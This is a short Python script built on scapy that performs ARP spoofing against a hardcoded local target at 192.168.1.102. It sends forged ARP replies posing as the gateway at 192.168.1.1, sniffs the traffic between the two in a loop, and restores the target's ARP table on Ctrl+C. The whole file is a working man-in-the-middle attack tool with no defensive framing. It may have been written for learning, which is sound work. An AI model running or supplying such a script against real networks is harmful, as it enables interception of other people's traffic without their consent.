import scapy.all as scapy
from colorama import Fore, Style, init
import time

init(autoreset=True)  # Initialize colorama for colored output

def GetMacFromIP(ip):
    # Sends an ARP request to retrieve the MAC address of the specified IP
    arp_request = scapy.ARP(pdst=ip)
    mac = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = mac / arp_request
    answered, unanswered = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)

    if answered:
        mac=answered[0][1].hwsrc
        return mac  # Return the MAC address of the target IP
    else:
        return None  # No MAC found

def spoof_computer(target_ip,target_mac, spoofed_ip):
    # Creates an ARP spoofing packet to associate the target IP with the attacker's MAC address
    ether = scapy.Ether(dst=target_mac)  # Ethernet destination
    arp = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)

    packet = ether / arp
    scapy.sendp(packet, verbose=False)

    print(Fore.YELLOW + f"[+] Spoofing {target_ip} pretending to be {spoofed_ip}")

def catch_packets(target_ip,spoofed_ip):
    # Sniffs packets and prints the source and destination IP addresses
    print(f"Sniffing IP packets from {target_ip} to {spoofed_ip}... (max 5 packets)")
    scapy.sniff(
        filter=f"host {target_ip} and host {spoofed_ip}",
        store=False,
        count=5,
        prn=lambda pkt: print(pkt.summary())
    )


def restore_computer_arp_table(target_ip, spoofed_ip):
    # Restores the ARP table of the target to its original state.
    dest_mac = GetMacFromIP(target_ip)
    source_mac = GetMacFromIP(spoofed_ip)
    if not dest_mac or not source_mac:
        return

    ether = scapy.Ether(dst=dest_mac)
    arp = scapy.ARP(op=2, pdst=target_ip, hwdst=dest_mac, psrc=spoofed_ip, hwsrc=source_mac)
    scapy.sendp(ether / arp, verbose=False)
    print(Fore.GREEN + f"[+] Restoring {target_ip} to its original state.")


if __name__ =="__main__":
    target_ip = "192.168.1.102" # Target IP address to spoof
    spoofed_ip = "192.168.1.1" # Default gateway IP
    try:
        target_mac = GetMacFromIP(target_ip)
        while True:
            spoof_computer(target_ip,target_mac, spoofed_ip)
            catch_packets(target_ip, spoofed_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print(Fore.RED + "[!] Detected CTRL+C. Restoring ARP tables... Please wait.")
        restore_computer_arp_table(target_ip, spoofed_ip)
        print(Fore.GREEN + "[+] ARP tables restored.")